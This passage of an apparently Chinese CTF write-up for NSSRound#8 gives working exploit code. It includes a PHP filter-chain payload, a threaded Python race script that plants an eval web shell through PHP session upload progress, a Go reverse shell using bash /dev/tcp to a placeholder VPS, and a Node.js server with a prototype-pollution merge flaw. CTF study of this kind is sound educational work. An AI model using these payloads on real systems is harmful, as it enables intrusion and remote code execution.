class="hljs-number">-8</span>BIT|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.865</span>.UCS<span class="hljs-number">-4</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.MAC.UTF16|<span class="hljs-type">convert</span>.iconv.L8.UTF16BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-156.</span>JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.base64-decode/resource=php://temp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310022052889.png" srcset="/img/loading.gif" lazyload alt="image-20231002205250718"></p>
+<h3 id="0x04-session-upload-progress"><a href="#0x04-session-upload-progress" class="headerlink" title="0x04.session upload progress"></a>0x04.session upload progress</h3><p>直接用脚本一把梭：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:28593/index.php&quot;</span><br>sessid = <span class="hljs-string">&#x27;leekos&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    filebytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(url=url, data=&#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        &#125;, cookies=&#123;<br>            <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid<br>        &#125;, files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;leekos.jpg&#x27;</span>, filebytes)<br>        &#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url=url + <span class="hljs-string">r&#x27;?file=/tmp/sess_&#x27;</span> + sessid, data=&#123;<br>            <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">r&quot;system(&#x27;env&#x27;);&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        &#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;leekos&#x27;</span> <span class="hljs-keyword">in</span> res1.text:<br>            <span class="hljs-built_in">print</span>(res1.text)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;retry~~~~&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Upload-gogoggo"><a href="#Upload-gogoggo" class="headerlink" title="Upload_gogoggo"></a>Upload_gogoggo</h2><p>上传一个go文件，文件名为：<code>run.go</code></p>
+<p>内容为<code>go语言反弹shell</code>：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	cmd := exec.Command(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&quot;</span>)<br>	out, err := cmd.CombinedOutput()<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Printf(<span class="hljs-string">&quot;combined out:\n%s\n&quot;</span>, <span class="hljs-type">string</span>(out))<br>		log.Fatalf(<span class="hljs-string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)<br>	&#125;<br>	fmt.Printf(<span class="hljs-string">&quot;combined out:\n%s\n&quot;</span>, <span class="hljs-type">string</span>(out))<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="ez-node"><a href="#ez-node" class="headerlink" title="ez_node"></a>ez_node</h2><p>server.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;multer&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">port</span> || <span class="hljs-number">3000</span><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-variable language_">global</span> = <span class="hljs-string">&quot;global&quot;</span><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listen at <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">let</span> objMulter = <span class="hljs-title function_">multer</span>(&#123; <span class="hljs-attr">dest</span>: <span class="hljs-string">&quot;./upload&quot;</span> &#125;);<br>app.<span class="hljs-title function_">use</span>(objMulter.<span class="hljs-title function_">any</span>());<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;./public&quot;</span>));<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/upload&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">let</span> oldName = req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">path</span>;<br>        <span class="hljs-keyword">let</span> newName = req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">path</span> + path.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">originalname</span>).<span class="hljs-property">ext</span>;<br>        fs.<span class="hljs-title function_">renameSync</span>(oldName, newName);<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-attr">err</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">url</span>:<br>            <span class="hljs-string">&quot;./upload/&quot;</span> +<br>            req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">filename</span> +<br>            path.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">originalname</span>).<span class="hljs-property">ext</span><br>        &#125;);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(error)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./err.js&#x27;</span>).<span class="hljs-title function_">getRandomErr</span>())<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/pollution&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(), <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = &#123;&#125;;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>);<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Register successfully!tql&#x27;</span>)<br>        <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./err.js&#x27;</span>).<span class="hljs-title function_">getRandomErr</span>()<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(error)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./err.js&#x27;</span>).<span class="hljs-title function_">getRandomErr</span>())<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>nodejs原型链污染</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/NSSRound-8/" class="print-no-link">#NSSRound#8</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NSSRound#8</div>
+      <div>https://leekosss.github.io/2023/10/02/NSSRound#8/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月2日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年10月2日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/04/%E4%BB%8E%E4%B8%80%E9%A2%98%E5%AD%A6%E4%B9%A0htaccess/" title="从一题学习.htaccess">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从一题学习.htaccess</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/30/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Da_piece_of_java/" title="【羊城杯 2020】a_piece_of_java">
+                        <span class="hidden-mobile">【羊城杯 2020】a_piece_of_java</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
